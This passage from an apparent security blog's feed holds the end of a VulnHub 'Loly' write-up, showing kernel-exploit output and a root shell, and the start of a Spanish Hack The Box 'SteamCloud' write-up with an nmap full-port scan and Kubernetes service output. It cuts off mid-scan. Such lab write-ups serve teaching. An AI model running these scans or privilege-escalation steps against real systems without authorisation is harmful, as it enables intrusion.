&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; credentials patched, launching shell...
&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
root
&lt;span class=&quot;c&quot;&gt;# cd /root&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# dir&lt;/span&gt;
proof.txt  root.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K0Hack</name></author><category term="Offensive" /><category term="Security," /><category term="Fuzzing," /><category term="Wordpress," /><category term="Wpscan," /><category term="Bruteforce," /><category term="ADRotate," /><category term="Upload" /><category term="File," /><category term="Kernel" /><category term="Exploit," /><category term="Ubuntu" /><category term="4.4," /><category term="Writeup" /><summary type="html">Loly ~ Offensive Security ~ VulnHub</summary></entry><entry><title type="html">Maquina Retirada SteamCloud de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/04/06/SteamCloud.html" rel="alternate" type="text/html" title="Maquina Retirada SteamCloud de Hack The Box (Necesario VIP)" /><published>2022-04-06T00:00:00-03:00</published><updated>2022-04-06T00:00:00-03:00</updated><id>http://localhost:4000/2022/04/06/SteamCloud</id><content type="html" xml:base="http://localhost:4000/2022/04/06/SteamCloud.html">&lt;h1 id=&quot;steamcloud--hack-the-box-&quot;&gt;SteamCloud ~ Hack The Box ~&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.133       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 &lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt;:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
| tls-alpn: 
|_  h2
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-02-14T22:41:11
|_Not valid after:  2023-02-14T22:41:11
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-02-14T22:41:11
|_Not valid after:  2023-02-14T22:41:12
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time
&lt;/span&gt;8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: d26a87e5-e803-43c5-bb05-83491b15c124
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 608dea06-2a35-4053-a494-fc3e243fb1d6
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3faf9dc0-ffc4-4c00-a461-1cf53b47030e
|     Date: Tue, 15 Feb 2022 18:39:37 GMT
|     Content-Length: 212
|     &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kind&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Status&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;apiVersion&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;v1&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;metadata&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Failure&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;forbidden: User &quot;&lt;/span&gt;system:anonymous&lt;span class=&quot;s2&quot;&gt;&quot; cannot get path &quot;&lt;/span&gt;/nice ports,/Trinity.txt.bak&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;reason&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Forbidden&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;details&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;:403&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: a0619f00-d9d1-427a-8826-86ea39143092
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 608dea06-2a35-4053-a494-fc3e243fb1d6
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3faf9dc0-ffc4-4c00-a461-1cf53b47030e
|     Date: Tue, 15 Feb 2022 18:39:36 GMT
|     Content-Length: 185
|     &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kind&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Status&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;apiVersion&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;v1&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;metadata&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Failure&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;forbidden: User &quot;&lt;/span&gt;system:anonymous&lt;span class=&quot;s2&quot;&gt;&quot; cannot get path &quot;&lt;/span&gt;/&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;reason&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Forbidden&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;details&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;:403&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: f7a4fd6b-8166-42e5-9cad-dd2acc308247
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 608dea06-2a35-4053-a494-fc3e243fb1d6
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3faf9dc0-ffc4-4c00-a461-1cf53b47030e
|     Date: Tue, 15 Feb 2022 18:39:37 GMT
|     Content-Length: 189
|_    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kind&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Status&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;apiVersion&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;v1&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;metadata&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Failure&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;forbidden: User &quot;&lt;/span&gt;system:anonymous&lt;span class=&quot;s2&quot;&gt;&quot; cannot options path &quot;&lt;/span&gt;/&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;reason&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Forbidden&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;details&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;:403&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title (application/json).
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-02-13T22:41:08
|_Not valid after:  2025-02-13T22:41:08
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn&apos;&lt;/span&gt;t have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
10250/tcp open  ssl/http         Golang net/http server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Go-IPFS json-rpc or InfluxDB API&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title (text/plain; charset=utf-8).
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=steamcloud@1644878477
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2022-02-14T21:41:16
|_Not valid after:  2023-02-14T21:41:16
|_ssl-date: TLS randomness does not represent time
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn&apos;&lt;/span&gt;t have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.92%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SSL%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2/15%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;620BEF4B%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gn
SF:u%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GetRequest,22F,&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20403&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Forbidden&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Audit-Id:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20a0619
SF:f00-d9d1-427a-8826-86ea39143092&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Cache-Control:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20no-cache,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20priva
SF:te&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20application/json&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;X-Content-Type-Options:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20n
SF:osniff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;X-Kubernetes-Pf-Flowschema-Uid:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20608dea06-2a35-4053-a494-fc
SF:3e243fb1d6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;X-Kubernetes-Pf-Prioritylevel-Uid:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;203faf9dc0-ffc4-4c00-
SF:a461-1cf53b47030e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Date:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Tue,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2015&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Feb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;202022&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2018:39:36&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20
SF:GMT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Length:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20185&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Status&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
SF:&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;v1&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;metadata&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;status&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;Failure&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;message&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;forbidden
SF::&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20User&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\\\&quot;&lt;/span&gt;system:anonymous&lt;span class=&quot;se&quot;&gt;\\\&quot;\x&lt;/span&gt;20cannot&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20get&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20path&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\\\&quot;&lt;/span&gt;/
SF:&lt;span class=&quot;se&quot;&gt;\\\&quot;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;reason&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;Forbidden&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;details&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;code&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:403&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(HTTP
SF:Options,233,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20403&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Forbidden&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Audit-Id:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20f7a4fd6b-816
SF:6-42e5-9cad-dd2acc308247&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Cache-Control:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20no-cache,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20private&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;C
SF:ontent-Type:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20application/json&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;X-Content-Type-Options:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20nosniff&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
SF:r&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;X-Kubernetes-Pf-Flowschema-Uid:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20608dea06-2a35-4053-a494-fc3e243fb
SF:1d6&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;X-Kubernetes-Pf-Prioritylevel-Uid:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;203faf9dc0-ffc4-4c00-a461-1c
SF:f53b47030e&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Date:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2015&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Feb&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;202022&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2018:39:37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;
SF:Content-Length:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20189&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;kind&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;Status&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;apiVersion&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;v1&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
SF:&lt;span class=&quot;s2&quot;&gt;&quot;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:{},&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Failure&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;forbidden:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Us
SF:er&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;system:anonymous&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20cannot&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20options&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20path&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
SF:&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;reason&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;Forbidden&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;details&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;code&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:403&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(FourOhF
SF:ourRequest,24A,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20403&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Forbidden&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Audit-Id:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20d26a87e5-
SF:e803-43c5-bb05-83491b15c124&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Cache-Control:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20no-cache,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20private&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;
SF:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;Content-Type:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20application/json&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;X-Content-Type-Options:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20nosni
SF:ff&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;X-Kubernetes-Pf-Flowschema-Uid:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20608dea06-2a35-4053-a494-fc3e24
SF:3fb1d6&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;X-Kubernetes-Pf-Prioritylevel-Uid:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;203faf9dc0-ffc4-4c00-a461
SF:-1cf53b47030e&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Date:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2015&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Feb&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;202022&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2018:39:37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
